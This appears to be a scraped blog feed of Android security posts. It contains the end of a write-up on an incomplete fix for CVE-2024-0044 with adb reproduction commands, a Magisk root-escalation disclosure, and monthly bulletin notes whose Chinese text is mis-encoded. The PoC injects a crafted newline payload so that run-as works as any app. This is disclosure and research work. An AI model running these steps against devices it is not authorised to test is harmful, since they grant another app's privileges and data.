PackageManager.INSTALL_FROM_ADB;@@ -935,6 +941,19 @@ throw new IllegalStateException(\"Failed to allocate session ID\"); &#125; + private static boolean isValidPackageName(@NonNull String packageName) &#123;+ if (packageName.length() &gt; SessionParams.MAX_PACKAGE_NAME_LENGTH) &#123;+ return false;+ &#125;+ // \"android\" is a valid package name+ String errorMessage = ParsingPackageUtils.validateName(+ packageName, /* requireSeparator= */ false, /* requireFilename */ true);+ if (errorMessage != null) &#123;+ return false;+ &#125;+ return true;+ &#125;+You can see params.installerPackageName will be reset to null if it is not an legal Android package name. However, at the next line, requestedInstallerPackageName can be installerPackageName when params.installerPackageName is null or invalid.What is installerPackageName?Letâ€™s take a look at the createSessionInternal method, where the patch was added to:1234567891011121314@Overridepublic int createSession(SessionParams params, String installerPackageName, String callingAttributionTag, int userId) &#123; try &#123; return createSessionInternal(params, installerPackageName, callingAttributionTag, userId); &#125; catch (IOException e) &#123; throw ExceptionUtils.wrap(e); &#125;&#125;private int createSessionInternal(SessionParams params, String installerPackageName, String installerAttributionTag, int userId) throws IOException&#123;&#125;You can see that installerPackageName is a separate argument that does not come from param. The original patch validated params.installerPackageName, but forgot to validate installerPackageName.ReproductionYou can just use the original exploit code from Tom Hebbâ€™s blog to reproduce it. This repo also contains a minimum reproducible PoC. If you want to test my PoC, just build it, push the generated apk to /data/local/tmp/poc.apk, then run the following code with adb shell:12345APK=/data/local/tmp/poc.apkPAYLOAD=\"@nullvictim &lt;victim uid&gt; 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"app_process -Djava.class.path=$APK /system/bin top.canyie.cve_2024_0044.PoC \"$APK\" \"$PAYLOAD\"run-as victimreplace &lt;victim uid&gt; with the UID of the victim app.If you want to play the game again, run adb uninstall top.canyie.cve_2024_0044 and re-run the code above.How it happened twice?The issue looks obvious, how did it escape everyoneâ€™s sight?Well, Google did add a test for this issue to ensure it is fixed:1234567891011121314151617181920212223242526272829303132333435363738394041424344// Set vulnerable 'appPackageName' and 'installerPackageName'// for 'SessionParams' instancefinal String vulnPackageName = context.getPackageName() + \"\\n\" + context.getPackageName();final SessionParams params = new SessionParams(MODE_FULL_INSTALL);params.setAppPackageName(vulnPackageName);params.setInstallerPackageName(vulnPackageName);final List&lt;String&gt; vulnerableFields = new ArrayList&lt;String&gt;();runWithShellPermissionIdentity( () -&gt; &#123; // Create session using 'SessionParams' instance, get 'appPackageName' and // 'installerPackageName' corresponding to session and abandon session later final PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller(); final int sessionId = packageInstaller.createSession(params); final String vulnerableAppPackageName = packageInstaller.getSessionInfo(sessionId).getAppPackageName(); final String vulnerableInstallerPackageName = packageInstaller .getSessionInfo(sessionId) .getInstallerPackageName(); packageInstaller.abandonSession(sessionId); // Without fix, 'appPackageName' and 'installerPackageName' does not undergo // internal validation and are set to 'vulnPackageName' which contain '\\n' if (vulnerableAppPackageName != null &amp;&amp; vulnerableAppPackageName.contains(\"\\n\")) &#123; vulnerableFields.add(\"'SessionParams.appPackageName'\"); &#125; if (vulnerableInstallerPackageName != null &amp;&amp; vulnerableInstallerPackageName.contains(\"\\n\")) &#123; vulnerableFields.add(\"'SessionParams.installerPackageName'\"); &#125; &#125;);String errorMessage = \"Device is vulnerable to b/307532206 !!\" + \" packages.list newline injection allows\" + \" run-as as any app from ADB\" + \" Due to : Fix is not present for \";assertWithMessage(errorMessage.concat(String.join(\" , \", vulnerableFields))) .that(vulnerableFields) .isEmpty();The test uses the public standard PackageInstaller API which does not allow customizing installerPackageName. In the public API, installerPackageName is always set to the real package name of provided Context:1234567891011public int createSession(@NonNull SessionParams params) throws IOException &#123; try &#123; return mInstaller.createSession(params, mInstallerPackageName, mAttributionTag, mUserId); &#125; catch (RuntimeException e) &#123; ExceptionUtils.maybeUnwrapIOException(e); throw e; &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125;&#125;When the caller is a 3rd-party app, installerPackageName is guaranteed to belong to the caller; when the caller is adb, it will always be reset to null, so this seems fine:12345678910111213141516171819202122String requestedInstallerPackageName = params.installerPackageName != null ? params.installerPackageName : installerPackageName;if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) &#123; params.installFlags |= PackageManager.INSTALL_FROM_ADB; // adb installs can override the installingPackageName, but not the // initiatingPackageName installerPackageName = null;&#125; else &#123; if (callingUid != Process.SYSTEM_UID) &#123; // The supplied installerPackageName must always belong to the calling app. mAppOps.checkPackage(callingUid, installerPackageName); &#125; // Only apps with INSTALL_PACKAGES are allowed to set an installer that is not the // caller. if (!TextUtils.equals(requestedInstallerPackageName, installerPackageName)) &#123; if (mContext.checkCallingOrSelfPermission(Manifest.permission.INSTALL_PACKAGES) != PackageManager.PERMISSION_GRANTED) &#123; mAppOps.checkPackage(callingUid, requestedInstallerPackageName); &#125; &#125;&#125;However, the operation occurs after requestedInstallerPackageName is set to installerPackageName, so the original value is kept.But if they run the original PoC provided by Tom Hebb instead of writing their own, they can catch the problem as the pm command calls the underlying createSession method with customized installerPackageName.One more question, why the problem isnâ€™t caught by someone else while the PoC is publicly accessible?Well, this vulnerability has been analyzed, reproduced and exploited by many people on the Internet, and there is an article written by Qidan He (flanker) of JD Dawn Security Lab (this is a very interesting article about CVE-2024-31317 btw) that says â€œå…¶ä¸­CVE-2024-0044å› ç®€å•ç›´æ¥ï¼Œåœ¨æŠ€æœ¯ç¤¾åŒºå·²ç»æœ‰äº†å¹¿æ³›çš„åˆ†æå’Œå…¬å¼€çš„expâ€ (â€œCVE-2024-0044 has been widely analyzed and publicly exploited in the technical community because it is simple and directâ€), however no one noticed it as if every one were under a spell.In fact, someone has successfully reproduced the exploit on patched builds, but the author doesnâ€™t seem to realize what happened. I found it by a code review and reported it on May 16, 2024, 2 months after the original patch was released. If anyone before me would have taken a few extra seconds to carefully look at the patch, or just try running the PoC on patched builds to see whether the issue is actually fixed, the bug bounty would have been theirs. This sounds like a Chinese lyric, â€œå†å¤šçœ‹ä¸€çœ¼å°±ä¼šçˆ†ç‚¸â€ï¼ˆâ€One more look and it will explodeâ€ï¼‰.","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"MagiskEoP (CVE-2024-48336)ï¼š Magisk App Arbitrary Code Execution Vulnerability","slug":"CVE-2024-48336","date":"2024-08-24T04:00:00.000Z","updated":"2025-04-24T10:33:02.808Z","comments":true,"path":"2024/08/24/CVE-2024-48336/","link":"","permalink":"https://blog.canyie.top/2024/08/24/CVE-2024-48336/","excerpt":"Magisk App before Canary version 27007 contains a vulnerability CVE-2024-48336, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package without user interaction.The following is copied from my repo https://github.com/canyie/MagiskEoP for backup purposes. For more info such as PoC code, please check the original repo.","text":"Magisk App before Canary version 27007 contains a vulnerability CVE-2024-48336, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package without user interaction.The following is copied from my repo https://github.com/canyie/MagiskEoP for backup purposes. For more info such as PoC code, please check the original repo.IntroductionThis is an exploit for a vulnerability CVE-2024-48336 in Magisk app that allows a local app to silently gain root access without user consent.Vulnerability was initially reported by @vvb2060 and PoC-ed by @canyie. It has been fixed in Canary 27007.Demo video for exploit this vulnerability to silently obtaining root privileges and granting root to any app: https://github.com/canyie/MagiskEoP/blob/main/screen-20220302-093745.mp4Steps to reproduce this vulnerability:Install vulnerable Magisk app builds on a device that has no GMS preinstalledInstall this exploit appForce stop Magisk app and this exploit appOpen Magisk appOpen this exploit app, type your commands and press Execute to execute them with root privilegesVulnerability InfoName: Magisk App Arbitrary Code Execution VulnerabilityAlias: Magisk Privilege Escalation VulnerabilityThe BasicsProduct: MagiskCVE: CVE-2024-48336Reporter: @vvb2060Initial Report Date: 2024-08-01Patch Date: 2024-08-21Disclosure Date: 2024-08-24Affected Versions: Manager v7.0.0 ~ Canary 27006First Patched Versions: Canary 27007Issue/Bug report: https://github.com/topjohnwu/Magisk/issues/8279Patch CL: https://github.com/topjohnwu/Magisk/commit/c2eb6039579b8a2fb1e11a753cea7662c07bec02Bug-introducing CL: https://github.com/topjohnwu/Magisk/commit/920b60da19212dd8d54d27ada77a30067ce50de6Bug Class: Unsafe Dynamic External Code LoadingWeakness Enumerations:CWE-386: Symbolic Name not Mapping to Correct ObjectCWE-829: Inclusion of Functionality from Untrusted Control SphereSummaryThe install() function of ProviderInstaller.java in Magisk App before canary version 27007 does not verify the GMS app before loading it, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package, aka Bug #8279. User interaction is not needed for exploitation.DetailsOld Android versions do not support some algorithms. To make Magisk work properly on these platforms, it tries to load conscrypt from GMS by calling createCallingContext(). Check this link for more details: https://t.me/vvb2060Channel/692However, GMS is not always preinstalled on all devices. Magisk assumes that loading code from GMS is always safe, however attackers can create a fake malicious app with the same package name. When Magisk app is launched, malicious code will get executed in Magisk app. Since Magisk app is always granted root access, this allows attackers to silently gain root access and execute arbitrary code with root privileges without user acceptance.Vulnerable DevicesDevices with no GMS preinstalledDevices with broken signature verification implementation (e.g. Disabled by CorePatch)Note: This issue is fixed in Canary 27007 by ensuring GMS is a system app before loading it. However, itâ€™s still possible to exploit this issue on devices with pre-installed GMS but have broken signature verification implementations (e.g. CorePatch).Note 2: Although a fix for this issue is present in the official Magisk app, there are many other instances of similar code exist in other apps without a proper fix such as this and this. This potentially allows an arbitrary code execution in vulnerable apps and potentially allows attackers to gain root access again if it is granted to victim apps.","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Android 2024 æ¯æœˆå®‰å…¨è¡¥ä¸åˆ†æç´¢å¼•","slug":"android-security-bulletin-index","date":"2024-04-18T11:27:12.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2024/04/18/android-security-bulletin-index/","link":"","permalink":"https://blog.canyie.top/2024/04/18/android-security-bulletin-index/","excerpt":"ä¹‹å‰ä¸€ç›´åœ¨çœ‹çš„æ¯æœˆè¡¥ä¸åˆ†æçš„åšå®¢ https://wrlus.com/ çœ‹èµ·æ¥æ˜¯ä¸å†æ›´æ–°äº†ï¼Œæƒ³äº†æƒ³åæ­£è‡ªå·±æ¯ä¸ªæœˆä¹Ÿè¦å»è¿½ç€çœ‹ï¼Œå¹²è„†å†™ä¸€ä¸‹åˆ†æå¾—äº†ï¼Œæ–¹ä¾¿è‡ªå·±åé¢æ‰¾ã€‚æœ¬äººå¾ˆèœï¼Œåˆ†æçš„å¤§éƒ¨åˆ†éƒ½æ˜¯ Java å±‚æ¼æ´ï¼Œå¤§ä½¬åˆ«éª‚æˆ‘ QAQæœ€åˆå‘è¡¨åœ¨æˆ‘çš„ telegram é¢‘é“ã€‚æ¯æœˆè¡¥ä¸éƒ½ä¼šåœ¨æ­¤æ–‡ä¸­æ›´æ–°ã€‚2025 å¹´åº¦è¡¥ä¸åˆ†æï¼šç‚¹æˆ‘æœ€åæ›´æ–°æ—¶é—´ï¼š2025/01/29 æ›´æ–°å†…å®¹ï¼šæ·»åŠ  2025 å¹´åº¦é“¾æ¥","text":"ä¹‹å‰ä¸€ç›´åœ¨çœ‹çš„æ¯æœˆè¡¥ä¸åˆ†æçš„åšå®¢ https://wrlus.com/ çœ‹èµ·æ¥æ˜¯ä¸å†æ›´æ–°äº†ï¼Œæƒ³äº†æƒ³åæ­£è‡ªå·±æ¯ä¸ªæœˆä¹Ÿè¦å»è¿½ç€çœ‹ï¼Œå¹²è„†å†™ä¸€ä¸‹åˆ†æå¾—äº†ï¼Œæ–¹ä¾¿è‡ªå·±åé¢æ‰¾ã€‚æœ¬äººå¾ˆèœï¼Œåˆ†æçš„å¤§éƒ¨åˆ†éƒ½æ˜¯ Java å±‚æ¼æ´ï¼Œå¤§ä½¬åˆ«éª‚æˆ‘ QAQæœ€åˆå‘è¡¨åœ¨æˆ‘çš„ telegram é¢‘é“ã€‚æ¯æœˆè¡¥ä¸éƒ½ä¼šåœ¨æ­¤æ–‡ä¸­æ›´æ–°ã€‚2025 å¹´åº¦è¡¥ä¸åˆ†æï¼šç‚¹æˆ‘æœ€åæ›´æ–°æ—¶é—´ï¼š2025/01/29 æ›´æ–°å†…å®¹ï¼šæ·»åŠ  2025 å¹´åº¦é“¾æ¥2024-12-01ä¸çŸ¥ä¸è§‰ï¼Œè¿™ä¸ªæ ç›®ç«Ÿç„¶å°±å¼€äº†æ•´æ•´ä¸€å¹´äº†ï¼Œè¯´å®è¯æˆ‘è‡ªå·±éƒ½æ²¡æƒ³åˆ°æˆ‘ç«Ÿç„¶èƒ½åšæŒä¸€å¹´ï¼Œæ„Ÿè°¢å¤§å®¶ä¸€ç›´ä»¥æ¥çš„é™ªä¼´ï¼ç»è¿‡ä¸€å¹´æ›´æ–°ï¼Œè¿™ç¯‡æ–‡ç« å·²ç»è¿‡é•¿ï¼Œä» 2025 å¹´å¼€å§‹å°†å¼€ä¸€ä¸ªæ–°çš„æ–‡ç« è¿›è¡Œæ›´æ–°ï¼Œä»¥ååº”è¯¥æ¯å¹´éƒ½ä¼šå¼€æ–°æ–‡ç« ã€‚æˆ‘ä»¬æ˜å¹´å†è§ï¼å¦å¤–ä¸ºä»€ä¹ˆè¿™ä¸ªæœˆè¡¥ä¸è¿™ä¹ˆå°‘ï¼Ÿæ‰å…­ä¸ªï¼Œè·Ÿä»¥å‰çš„å®Œå…¨ä¸æ˜¯ä¸€ä¸ªé‡çº§FrameworkCVE-2024-43762 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚App Widget Service ç»‘å®šåˆ° app çš„ service æ—¶æ²¡æœ‰æ­£ç¡®å¤„ç† onNullBindingï¼Œä¼šå¯¼è‡´è¿æ¥ä¸ä¼šè¢«é”€æ¯ã€‚CVE-2024-43764 EoP High 1è®¾å¤‡æ²¡è§£é”çš„æ—¶å€™ç¦æ­¢è¿›å…¥äº¤äº’å¼å‰ªè´´æ¿é¡µé¢ï¼Œå¦åˆ™å¯èƒ½è®©æ¥è§¦åˆ°è®¾å¤‡çš„æ”»å‡»è€…é€šè¿‡å‰ªè´´æ¿é‡Œå·²æœ‰çš„ intent é€ƒé€¸å‡ºé”å±ã€‚å…¶å®åº”è¯¥è¿˜æœ‰ä¿¡æ¯æ³„æ¼ï¼ŸCVE-2024-43769 EoP High 1è¿˜æœ‰é«˜æ‰‹ï¼ˆï¼Ÿï¼Ÿå¦‚æœ Device Management è¿™ä¸ª role çš„æŒæœ‰è€…æ˜¯ç³»ç»Ÿåº”ç”¨ï¼Œåœ¨å…¶ä»–ç”¨æˆ·ä¹Ÿå°†å…¶å½“ä½œ device admin è€Œéä»…åœ¨å®ƒæ‰€åœ¨çš„ç”¨æˆ·ï¼Œå› ä¸º apk çš„ç‰ˆæœ¬æ˜¯è·¨ç”¨æˆ·å…¨å±€å…±äº«çš„ï¼Œåœ¨ä¸€ä¸ªæ— å…³ç”¨æˆ·é€‰æ‹©å¸è½½æ›´æ–°ä¼šå½±å“å…¶ä»–å—ç®¡ç”¨æˆ·ï¼Œå¯¹è®¾å¤‡ç®¡ç†åŠŸèƒ½é€ æˆæ½œåœ¨å½±å“ï¼Œåº”è¯¥ç¦æ­¢ã€‚Device Management Role è¿™ä¸ªåŠŸèƒ½å…¶å®æ²¡çœ‹è§æœ‰å¤šå°‘äººç”¨ï¼Œåº”è¯¥è¿˜æ˜¯ä¼ ç»Ÿçš„ device owner / profile owner ç”¨çš„äººæ¯”è¾ƒå¤šã€‚Systemä¸‰ä¸ªéƒ½æ˜¯ libskia ä¸­çš„å†…å­˜æ¼æ´ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå°‘è§çš„ã€‚ç®€å•çœ‹äº†ä¸€ä¸‹å’Œä¸Šä¸ªæœˆçš„ CVE-2024-43091 åŸºæœ¬ç±»ä¼¼ï¼Œè‡´è°¢ä¿¡æ¯ä¹Ÿéƒ½æ˜¯ Google çš„åŒä¸€ä¸ªäººï¼Œåº”è¯¥æ˜¯ä»£ç å®¡æŸ¥çš„æ—¶å€™çœ‹è§çš„ã€‚CVE-2024-43767 RCE High 1SkBlurMF.cpp æœ‰ä¸€ä¸ªåœ°æ–¹è°ƒç”¨äº† computeImageSize() è®¡ç®—è¦åˆ†é…çš„å¤§å°ï¼Œä½†æ²¡æ£€æŸ¥è®¡ç®—æ—¶å‘ç”Ÿæº¢å‡ºçš„æƒ…å†µï¼ˆè¿™ä¸ªæ—¶å€™ä¼šè¿”å› 0ï¼‰ï¼Œä¼šåœ¨ä¸‹æ–¹åˆ†é…å‡ºå¤§å°ä¸º 0 çš„å†…å­˜ã€‚CVE-2024-43097 EoP High 1SkRegion.cpp å†…è®¡ç®—åˆ†é…å†…å­˜å¤§å°æ—¶å¯èƒ½ä¼šå‘ç”Ÿæº¢å‡ºã€‚CVE-2024-43768 EoP High 1src/pdf/SkDeflate.cpp skia_alloc_func æ›´åŠ ä¸¥æ ¼åœ°æ ¡éªŒ size å’Œ itemsï¼Œçœ‹èµ·æ¥ä¹Ÿæ˜¯ç±»ä¼¼çš„é—®é¢˜ï¼Œé˜²æ­¢æ•°å­¦è®¡ç®—äº§ç”Ÿéé¢„æœŸçš„ç»“æœè¿›è€Œå¯¼è‡´åˆ†é…çš„å†…å­˜å¤§å°å°äºé¢„æœŸã€‚P.S. æ„Ÿå…´è¶£çš„äººè¿˜å¯ä»¥çœ‹çœ‹ SkTFitsIn è¿™ä¸ªå‡½æ•°çš„å®ç°ï¼Œæˆ‘çœ‹äº†ä¸€çœ¼ï¼Œæ„Ÿè§‰éå¸¸ä»™äºº2024-11-01FrameworkCVE-2024-40660 EoP High 1 2çœ‹èµ·æ¥æ˜¯å’Œ CVE-2024-34743 ç±»ä¼¼çš„é—®é¢˜ï¼Œå¼•ç”¨æ‹·è´å†™æˆäº†å€¼æ‹·è´ã€‚CVE-2024-43081 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚æ­¤æ¼æ´æ˜¯ CVE-2024-0046 çš„å˜ä½“ï¼Œå½“æ—¶çš„è¡¥ä¸åªé™åˆ¶äº†ç³»ç»Ÿ app ä¸èƒ½è¢«å®‰è£…ä¸º instant appï¼Œå¾ˆå®¹æ˜“èƒ½æƒ³åˆ°é™¤äº†ç³»ç»Ÿ appï¼Œè®¾å¤‡ç®¡ç† app ä¹Ÿä¸åº”è¯¥è¢«é™åˆ¶ï¼Œç›´æ¥åˆæäº†ä¸ªæŠ¥å‘Šã€‚è¡¥ä¸åŠ ä¸Šäº† device admin app å’Œè¢«ä¿æŠ¤çš„ app çš„æ£€æµ‹ã€‚CVE-2024-43085 EoP High 1USB ä¼ è¾“æ¨¡å¼åˆ‡æ¢è¶…æ—¶çš„æ—¶å€™ï¼Œå¦‚æœå½“å‰å¤„äº Accessory æ¨¡å¼ï¼Œä¸åº”è¯¥ç»§ç»­ä¿æŒåœ¨è¿™ä¸ªæ¨¡å¼ï¼Œä»¥é˜»æ­¢ USB è®¾å¤‡ç»§ç»­é€šè¿‡ Android Open Accessory åè®®å’Œ Android è®¾å¤‡è¿›è¡Œäº¤äº’ã€‚Android Open Accessory æ–‡æ¡£ï¼šhttps://source.android.com/docs/core/interaction/accessories/protocolCVE-2024-43093 EoP High 1æ­¤æ¼æ´ç”± LSPosed å›¢é˜ŸæŠ¥å‘Šã€‚åœ¨ä¼ å…¥çš„ URI ä¸­æ’å…¥ Unicode å¯å¿½ç•¥ä»£ç ç‚¹å¯ç»•è¿‡ /sdcard/Android/data è®¿é—®é™åˆ¶ã€‚æŠ€æœ¯ç»†èŠ‚ï¼šhttps://t.me/vvb2060Channel/855CVE-2024-43082 ID High 1è®¾ç½®æ–°ç”¨æˆ·å¤´åƒæ—¶æ£€æŸ¥è¿”å›çš„ URIï¼Œé¿å…å‡ºç°è·¨ç”¨æˆ·è¯»å–ã€‚è¿™ä¸ªåœ°æ–¹æˆ‘ä¹‹å‰å°è¯•è¿‡åˆ©ç”¨ï¼Œä½†æ˜¯æ²¡æˆåŠŸï¼Œæ²¡èƒ½æ‹¦æˆªåˆ°ä»»ä½•ä¸€ä¸ª intentï¼Œä¸çŸ¥é“æ¼æ´çš„ä½œè€…æ˜¯æ€ä¹ˆåšåˆ°çš„ã€‚çœ‹è¡¥ä¸åªç»™ 12 12L æ›´æ–°äº†ï¼Œå¯èƒ½æ˜¯å®‰å“å¤§ç‰ˆæœ¬çš„è¡Œä¸ºå·®å¼‚å¯¼è‡´ã€‚CVE-2024-43084 ID High 1NotificationManagerService æ£€æŸ¥ notification URI çš„æ—¶å€™ï¼Œå¦‚æœå®ƒå¸¦æœ‰ Person å¯¹è±¡ï¼Œä¸ä»…è¦æ£€æŸ¥å®ƒçš„ Icon URI è¿˜è¦æ£€æŸ¥ mUriã€‚CVE-2024-43086 ID High 1å¦‚æœè´¦å·çš„ authenticator uid å‘ç”Ÿæ”¹å˜ï¼Œæ¸…æ‰å¯¹åº”è´¦å·ç±»å‹çš„æ‰€æœ‰æ•°æ®ã€‚çœ‹èµ·æ¥æ˜¯ AccountManagerService é‡Œçš„æ•°æ®èƒ½æ‚¬ç©ºã€‚SystemCVE-2024-43091 RCE High 1libskia çš„ä¸€ä¸ªæ•´æ•°æº¢å‡ºé—®é¢˜ï¼Œä¹‹å‰çš„ä»£ç åªæ£€æŸ¥äº† dst-&gt;computeImageSize() çš„ç»“æœæ²¡æº¢å‡ºï¼Œä½†ä¸‹é¢åˆ†é…äº† size ä¹˜ä¸‰å€çš„å†…å­˜ï¼Œè¿™é‡Œæœ‰å¯èƒ½å‘ç”Ÿæº¢å‡ºå¯¼è‡´åˆ†é…åˆ°çš„å†…å­˜ç©ºé—´å°äºé¢„æœŸï¼Œè¿›è€Œå‘ç”Ÿè¶Šç•Œå†™ã€‚CVE-2024-29779 EoP High 1æ²¡å¤ªçœ‹æ‡‚ï¼Œçœ‹èµ·æ¥æ˜¯ä»£ç é‡Œå®ç°äº† Keymint3 çš„ ATTESTATION_ID_SECOND_IMEI ä½†æ˜¯å¿˜è®°å¯ç”¨çš„æ ·å­CVE-2024-34719 EoP High 1è“ç‰™ç»„ä»¶é‡Œç¦æ­¢ä¼ å…¥çš„ AttributionSource æ˜¯ null çš„æƒ…å†µï¼Œå› ä¸ºè“ç‰™ä¾èµ– AttributionSource æ£€æŸ¥è°ƒç”¨è€…æƒé™ï¼Œä¼  null çš„æ—¶å€™ä¸ä¼šè§¦å‘ AttributionSource ååºåˆ—åŒ–ä¹Ÿå°±ä¸ä¼šè§¦å‘æƒé™æ ¡éªŒæµç¨‹ã€‚é¢˜å¤–è¯ï¼šè¿™ä¸ª bug çš„ id æ˜¯ 242996380ï¼Œä¼°è®¡éƒ½æ˜¯ä¸¤å¹´å‰çš„äº†ï¼Œè¿™ä¸ªå¤„ç†é€Ÿåº¦ï¼Œæˆ‘ä¹Ÿä¸ç›´æ¥è¯„ä»·äº†ï¼Œæˆ‘å°±ç»™å››ä¸ªå­—ï¼Œä»¤äººå’‹èˆŒCVE-2024-40661 EoP High 1device admin ä¸å…è®¸ä¸»åŠ¨æˆäºˆéšç§ç›¸å…³çš„æƒé™ï¼Œæ¯”å¦‚å½•éŸ³ç…§ç›¸å’Œä½ç½®æƒé™ï¼Œè¿™ä¸ªæ£€æŸ¥è¦æŠŠæƒé™çš„æƒé™ç»„ä¸€èµ·çº³å…¥æ£€æŸ¥ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æƒé™åã€‚CVE-2024-43080 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚Settings AppRestrictionsFragment æ¥æ”¶ app ä¼ å›çš„åŸå§‹ intent ä¹‹åä¸èƒ½ç›´æ¥ä¼ ç»™ startActivityï¼Œé¿å…åœ¨ AIDL è°ƒç”¨è¿‡ç¨‹ä¸­å‡ºç°ç±»å‹æ··æ·†æ±¡æŸ“åç»­æ•°æ®ã€‚æ›´å¤šå¯å‚è€ƒ https://konata.github.io/posts/creator-mismatch/CVE-2024-43087 EoP High 1Settings AccessibilitySettings æ˜¾ç¤ºæ— éšœç¢æœåŠ¡åˆ—è¡¨çš„æ—¶å€™ä¼šè¿‡æ»¤ service label å’Œ activity label ç›¸åŒçš„æœåŠ¡ï¼Œå¯¼è‡´å…¶è¢«éšè—ä¸æ˜¾ç¤ºè€Œä»ç„¶æ‹¥æœ‰æ— éšœç¢æƒé™ã€‚è¿™ä¸ªå¤„ç†çœ‹ä¸æ‡‚åŸæœ¬æ˜¯å¹²å•¥çš„ï¼Œå®Œå…¨å¤šæ­¤ä¸€ä¸¾ï¼Œè¡¥ä¸å°±æ˜¯åˆ æ‰äº†å¯¹åº”ä»£ç ã€‚CVE-2024-43088 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚Settings ä¸­ AppInfoBase æ˜¯ä¸€ä¸ª base fragmentï¼Œæ¥æ”¶è°ƒç”¨è€…æŒ‡å®šçš„ user handle ç„¶åç›´æ¥ä½¿ç”¨ï¼Œå…¨ç¨‹æ²¡è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æŒ‡å®šä»»æ„ç”¨æˆ·ä»è€Œä»£è¡¨å…¶ä»–ç”¨æˆ·ä¿®æ”¹å…¶ app çš„æƒé™ã€‚è¡¥ä¸åŠ äº†ä¸ªæ£€æŸ¥ä¿è¯è°ƒç”¨è€…å¿…é¡»è¦æœ‰ INTERACT_ACROSS_USERS_FULL æƒé™ã€‚è¿™ä¸ªæ¼æ´æ˜¯æˆ‘ä¹‹å‰ç¼–å†™ Android å¹³å°å¸¸è§å®‰å…¨æ¼æ´ç±»å‹ çš„æ—¶å€™æ³¨æ„åˆ° CVE-2023-21107 è¿™ä¸ªç›¸ä¼¼çš„æ¼æ´ï¼Œé¡ºä¾¿æœç´¢äº†ä¸€ä¸‹æ¶‰åŠçš„ Intent.EXTRA_USER_HANDLE è¿˜æœ‰æ²¡æœ‰å…¶ä»–åœ°æ–¹æœ‰å¼•ç”¨ï¼Œç„¶åå°±è®©æˆ‘å‘ç°äº†è¿™ä¸ªä¸€æ¨¡ä¸€æ ·çš„æ¼æ´ï¼Œå±äºæ˜¯ç™½æ¡å¤©ä¸Šæ‰ä¸‹æ¥çš„é’±äº†ã€‚CVE-2024-43089 EoP High 1MediaProvider ä¸­ï¼Œapp å°è¯•é‡å‘½åæ–‡ä»¶æ—¶éœ€è¦æ£€æŸ¥å…¶æƒé™ï¼Œä»¥å…åœ¨ MediaProvider æ•°æ®åº“ä¸­ç•™ä¸‹è™šå‡çš„è®°å½•ï¼Œè®© app å¯ä»¥è¯»å†™åŸæœ¬ä¸å±äºå®ƒçš„æ–‡ä»¶ã€‚CVE-2024-43090 ID High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚Android æœ‰ä¸€ä¸ªåŠŸèƒ½å«åš keyboard shortcuts helperï¼Œå…¶å®ç°æ˜¯ç³»ç»Ÿå‘å½“å‰å‰å° app æ”¶é›†å¯ç”¨å¿«æ·é”®ï¼Œç„¶åäº¤ç”± SystemUI æŠŠå®ƒæ¸²æŸ“å‡ºæ¥ï¼Œå…¶åŒ…å«ç€ä¸€ä¸ªéšè—çš„ Icon å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨åå°„è¿›è¡Œä¿®æ”¹ã€‚è¡¥ä¸è¡¨ç¤ºè¿™ä¸ªåŠŸèƒ½ä¸åº”è¯¥ç”± app ä½¿ç”¨ï¼Œç›´æ¥æ¸…ç©ºäº†æ‰€æœ‰ app æä¾›çš„ iconã€‚CVE-2024-43083 DoS High 1WiFi æ¨¡å—ä¸­å¿˜è®°æ ¡éªŒæä¾›çš„ WifiConfiguration ä¸­çš„å¤šä¸ªå­—æ®µï¼Œå¯èƒ½å¼•å‘æ‹’ç»æœåŠ¡ï¼Œåº”è¯¥æ˜¯å†…å­˜èµ„æºè€—å°½ã€‚æœ€è¿‘è¿™ç§æ¼æ´æ˜¯çœŸçš„å¤šï¼Œå‡ ä¹æ¯ä¸ªæœˆéƒ½èƒ½çœ‹è§ã€‚2024-10-01FrameworkCVE-2024-0044 EoP High 1 2æ˜¯ä¸æ˜¯æ„Ÿè§‰è¿™ä¸ª CVE å·å¾ˆç†Ÿæ‚‰ï¼Ÿå¯¹ï¼Œè¿™ä¸ªæ¼æ´åœ¨ä¸‰æœˆå…¬å‘Šé‡Œå°±æ”¾è¿‡ä¸€æ¬¡ã€‚åé¢æˆ‘å‘ç°åŸè¡¥ä¸ç»™çš„ä¿®å¤å¹¶ä¸å……åˆ†é‡æ–°å‘é€äº†ä¸€ä¸ªæŠ¥å‘Šï¼Œç»™è¿™ä¸ªä¸‰æœˆä»½å°±åº”è¯¥è¢«ä¿®å¤çš„æ¼æ´ç»­å‘½åˆ°äº†åæœˆã€‚æ›´å¤šç»†èŠ‚å¯ä»¥å‚è€ƒæˆ‘çš„ PoC &amp; writeupï¼š 